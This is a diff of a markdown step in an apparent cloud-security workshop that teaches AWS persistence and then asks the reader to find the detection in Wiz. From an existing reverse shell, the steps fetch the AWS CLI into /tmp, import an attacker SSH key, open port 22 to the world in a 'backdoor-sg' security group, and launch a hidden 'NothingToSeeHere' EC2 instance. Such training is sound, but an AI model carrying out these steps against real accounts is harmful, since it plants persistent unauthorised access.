@@ -12,58 +12,61 @@ Mitre ATT&CK defines persistence as techniques to allow adversaries to maintain 
 
 ### 🎯 Your Mission
 
-1. Ensure your reverse shell is still active. You can re-run the reverse shell commands from [2-Reverse-Shell.md](2-Reverse-Shell.md) if needed.
-2. On your laptop, open a terminal and run the following command to generate a new SSH keypair:
+1. On your laptop, open a terminal and run the following command to generate a new SSH keypair:
 ```bash
 ssh-keygen -t rsa -f attacker_key
 ```
-3. Update the permissions on the generated keys 
+2. Update the permissions on the generated keys 
 ```bash
 chmod 0600 attacker_key*
 ```
-4. Run the following command to obtain the attacker_key public key. Note it down as you'll need this shortly.
+3. Run the following command to obtain the attacker_key public key. Note it down as you'll need this shortly.
 ```bash
 cat attacker_key.pub
 ```
-5. Using the reverse shell terminal, run the following commands What do you see? - A read/write mapped drive that includes the ssh folder containing the authorized_keys file.
+4. Ensure your reverse shell is still active. You can re-run the reverse shell commands from [2-Reverse-Shell.md](2-Reverse-Shell.md) if needed.
+5. Run the following commands to install the AWS CLI (note we're using the tmp directory which is writeable):
 ```bash
-ls /flappy
-ls -alh /flappy/mapped_drive
-ls -alh /flappy/mapped_drive/.ssh
+curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "/tmp/awscliv2.zip" && unzip /tmp/awscliv2.zip -d /tmp/aws && cd /tmp/aws && ./install --install-dir /tmp/aws-cli --bin-dir /tmp/aws-cli-bin && /tmp/aws-cli-bin/aws sts get-caller-identity
 ```
-6. Run the command using the output from step 3 to add your newly generated public key to the authorized key file on the .
+6. Run the following command to create a file containing your attacker public key
 ```bash
-echo "public key from Step 4" >> /flappy/mapped_drive/.ssh/authorized_keys
+echo "{attacker_key.pub}" > /tmp/attacker_key.pub
 ```
-7. Run the command to get the IP address of the WebServer EC2 instance (this should match the Public IP in the AWS console):
+7. Run the following command to import your SSH Public Key
 ```bash
-curl ipconfig.io
+/tmp/aws-cli-bin/aws ec2 import-key-pair --key-name attacker_key --public-key-material fileb:///tmp/attacker_key.pub
 ```
-8. SSH to the EC2 instance directly:
+8. Run the following command to create a security group
 ```bash
-ssh -i attacker_key ubuntu@ip_address
+/tmp/aws-cli-bin/aws ec2 create-security-group \
+--group-name backdoor-sg \
+--description "SSH access for attacker" \
+--vpc-id $(/tmp/aws-cli-bin/aws ec2 describe-vpcs --query "Vpcs[0].VpcId" --output text)
 ```
-At this point we've gained persistence to the underlying EC2 host. But what if the host is shut down or terminated? Let's now spin up a shadow EC2 instance using excessive AWS permissions.
-
-9. Run the following commands to install jq and the AWS CLI:
+9. Run the following command to create a security group rule:
 ```bash
-curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && ./aws/install && aws sts get-caller-identity
+/tmp/aws-cli-bin/aws ec2 authorize-security-group-ingress \
+--group-id $(/tmp/aws-cli-bin/aws ec2 describe-security-groups --filters "Name=group-name,Values=backdoor-sg" --query "SecurityGroups[0].GroupId" --output text) \
+--protocol tcp \
+--port 22 \
+--cidr 0.0.0.0/0
 ```
-
 10. Run the following command to launch a new shadow EC2 instance:
 ```bash
-aws ec2 run-instances \
-    --instance-type t2.micro \
-    --image-id ami-0aa2b7722dc1b5612 \
-    --subnet-id $(aws ec2 describe-subnets --query "Subnets[?MapPublicIpOnLaunch].SubnetId | [0]" --output text) \
-    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=NothingToSeeHere}]' \
-    --associate-public-ip-address
+/tmp/aws-cli-bin/aws ec2 run-instances \
+--instance-type t2.micro \
+--image-id ami-0aa2b7722dc1b5612 \
+--subnet-id $(/tmp/aws-cli-bin/aws ec2 describe-subnets --query "Subnets[?MapPublicIpOnLaunch].SubnetId | [0]" --output text) \
+--tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=NothingToSeeHere}]' \
+--security-group-ids $(/tmp/aws-cli-bin/aws ec2 describe-security-groups --group-names backdoor-sg --query "SecurityGroups[0].GroupId" --output text) \
+--key-name attacker_key \
+--associate-public-ip-address
 ```
+11. SSH to the newly created EC2 instance
 
 
 Congratulations, you've completed this challenge. Can you now find the corresponding detection in Wiz? How long did it take to appear in the console?
 
 ### 💥 Hints & Tips
 
-Note: Don't forget to substitute:
-- ip_address in Step 8 for the IP address output from Step 7.
